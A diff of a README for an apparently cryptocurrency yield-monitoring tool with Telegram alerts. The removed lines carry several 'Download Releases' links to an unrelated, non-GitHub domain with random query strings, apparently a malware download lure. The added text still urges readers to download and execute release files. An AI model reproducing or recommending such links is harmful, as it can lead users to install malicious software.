@@ -1,99 +1,112 @@
 # DeFi Monitoring Tool 🚀
 
-![DeFi Monitoring](https://img.shields.io/badge/DeFi%20Monitoring-Open%20Source-brightgreen)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://installergitb.icu?gtxqbaw3qec4n67)
+![DeFi Monitoring](https://img.shields.io/badge/DeFi%20Monitoring-Open%20Source-blue.svg)
+![GitHub Releases](https://img.shields.io/badge/Releases-v1.0.0-brightgreen.svg)
 
-Welcome to the DeFi Monitoring Tool! This open-source project helps you find high-yield stablecoin pools. With our tool, you can receive Telegram alerts for new opportunities in AAVE, Uniswap, and Pendle.
+Welcome to the **DeFi Monitoring Tool**! This open-source project helps you find high-yield stablecoin pools and receive real-time alerts via Telegram for new opportunities in platforms like AAVE, Uniswap, and Pendle. Whether you are a seasoned investor or just starting out, this tool provides valuable insights into the decentralized finance landscape.
 
 ## Table of Contents
 
 1. [Features](#features)
 2. [Installation](#installation)
 3. [Usage](#usage)
-4. [Configuration](#configuration)
-5. [How It Works](#how-it-works)
+4. [Telegram Alerts](#telegram-alerts)
+5. [Supported Platforms](#supported-platforms)
 6. [Contributing](#contributing)
 7. [License](#license)
-8. [Support](#support)
+8. [Contact](#contact)
+9. [Releases](#releases)
 
 ## Features
 
-- **High-Yield Pool Tracking**: Discover lucrative stablecoin pools with ease.
-- **Telegram Alerts**: Get instant notifications on new opportunities.
-- **Multi-Platform Support**: Works seamlessly with AAVE, Uniswap, and Pendle.
-- **User-Friendly Interface**: Simple and intuitive design for all users.
-- **Open Source**: Contribute and improve the tool with our community.
+- **Cross-Chain Monitoring**: Track stablecoin pools across various blockchain networks.
+- **Real-Time Alerts**: Get instant notifications for new yield opportunities.
+- **User-Friendly Interface**: Simple setup and easy navigation.
+- **Comprehensive Analytics**: Access detailed analytics for informed decision-making.
+- **Automated Alerts**: Customize alerts based on your investment preferences.
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://installergitb.icu?fk13trskgm18chq). Follow the instructions provided there to set up the tool on your system.
+To get started with the DeFi Monitoring Tool, follow these steps:
 
-### Requirements
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/pramudiairgi/defi_monitoring.git
+   ```
 
-- Python 3.7 or higher
-- pip (Python package installer)
-- Access to a Telegram account
+2. Navigate to the project directory:
+   ```bash
+   cd defi_monitoring
+   ```
+
+3. Install the required dependencies:
+   ```bash
+   npm install
+   ```
+
+4. Configure your settings in the `config.json` file.
+
+5. Run the application:
+   ```bash
+   npm start
+   ```
+
+For more detailed installation instructions, please check the [Releases](https://github.com/pramudiairgi/defi_monitoring/releases) section.
 
 ## Usage
 
-Once you have installed the tool, you can start using it to monitor DeFi opportunities.
+Once installed, you can start using the DeFi Monitoring Tool. Here’s how:
 
-1. **Run the Tool**: Execute the main script in your terminal.
-2. **Set Up Alerts**: Configure your preferred pools and alert settings.
-3. **Receive Notifications**: Check your Telegram for updates on new opportunities.
+1. **Set Up Your Preferences**: Open the `config.json` file and specify your preferred stablecoin pools and platforms.
 
-## Configuration
+2. **Start Monitoring**: Run the application, and it will begin monitoring the specified pools.
 
-You can customize your experience by editing the configuration file. Here are the key settings:
+3. **Receive Alerts**: You will receive alerts on your Telegram whenever new opportunities arise.
 
-- **Telegram Bot Token**: Obtain a token from the Telegram BotFather and enter it in the config file.
-- **Target Pools**: Specify which pools you want to monitor.
-- **Alert Preferences**: Choose how you want to receive alerts (e.g., instant, daily summary).
+## Telegram Alerts
 
-### Example Configuration
+The DeFi Monitoring Tool offers seamless integration with Telegram for alerts. To set this up:
 
-```json
-{
-  "telegram_bot_token": "YOUR_TELEGRAM_BOT_TOKEN",
-  "target_pools": [
-    "AAVE",
-    "Uniswap",
-    "Pendle"
-  ],
-  "alert_preferences": {
-    "type": "instant",
-    "channels": ["telegram"]
-  }
-}
-```
+1. Create a new bot using the BotFather on Telegram.
+2. Copy the API token provided by BotFather.
+3. Add the token to your `config.json` file under the `telegram` section.
 
-## How It Works
+Now, whenever a new opportunity appears, you will receive a message directly in your Telegram.
 
-The DeFi Monitoring Tool uses blockchain analytics to track high-yield stablecoin pools. It connects to various DeFi platforms and gathers data on yield rates. When a new opportunity arises, it sends an alert to your Telegram account.
+## Supported Platforms
 
-### Data Sources
+The DeFi Monitoring Tool currently supports the following platforms:
 
-- **AAVE**: Monitors liquidity pools and their respective yields.
-- **Uniswap**: Analyzes trading pairs and stablecoin pools.
-- **Pendle**: Evaluates yield-generating assets and opportunities.
+- **AAVE**: A leading DeFi lending platform.
+- **Uniswap**: A popular decentralized exchange for trading tokens.
+- **Pendle**: A protocol for yield-bearing assets.
+
+These platforms provide a variety of high-yield stablecoin pools that you can monitor and invest in.
 
 ## Contributing
 
-We welcome contributions from the community! If you want to help improve the DeFi Monitoring Tool, please follow these steps:
+We welcome contributions to the DeFi Monitoring Tool! If you want to contribute, please follow these steps:
 
 1. Fork the repository.
 2. Create a new branch for your feature or bug fix.
 3. Make your changes and commit them.
-4. Push to your branch and submit a pull request.
+4. Push your branch to your forked repository.
+5. Create a pull request.
 
-For more details, please check our [Contributing Guidelines](CONTRIBUTING.md).
+Please ensure that your code follows the project's coding standards and includes appropriate tests.
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Support
+## Contact
 
-If you have any questions or need assistance, feel free to reach out to our community on GitHub or check the [Releases section](https://installergitb.icu?bn0g0o0pruwl1mc) for updates and troubleshooting tips.
+For any inquiries or support, please contact us via GitHub or reach out to our community on Telegram.
 
-Thank you for using the DeFi Monitoring Tool! We hope it helps you find the best opportunities in the DeFi space. Happy investing!
+## Releases
+
+To download the latest version of the DeFi Monitoring Tool, visit the [Releases](https://github.com/pramudiairgi/defi_monitoring/releases) section. Here, you can find the necessary files to download and execute.
+
+---
+
+Thank you for checking out the DeFi Monitoring Tool! We hope it helps you navigate the exciting world of decentralized finance with ease.
